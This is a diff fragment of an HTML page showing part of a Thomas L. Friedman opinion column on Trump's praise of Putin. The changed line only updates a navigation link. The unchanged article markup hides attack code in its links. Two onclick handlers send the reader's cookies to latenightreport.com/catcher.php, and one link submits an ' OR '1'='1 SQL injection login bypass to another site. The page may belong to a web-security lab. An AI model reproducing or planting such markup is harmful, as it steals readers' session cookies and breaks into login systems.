@@ -19,7 +19,7 @@
 
 <p class="details">Thomas L. Friedman SEPT. 14, 2016<a href="#"></a> </p>
 <h2 align="right"><a href="20160913-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160915-opinion.php"> Next </a> </h2>
 
 <p>
 When it comes to rebutting Donald Trump’s <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">idiotic observation </a> that Vladimir Putin is a strong leader — “far more than our president has been a leader” — it is hard to top the assessment of <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">Russian-born Garry Kasparov,</a> the former world chess champion, which The Times’s Andrew Higgins quoted in his story from Moscow: “Vladimir Putin is a strong leader in the same way that arsenic is a strong drink. Praising a brutal K.G.B. dictator, especially as preferable to a democratically elected U.S. president, whether you like Obama or hate him, is <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> despicable and dangerous.”</a>
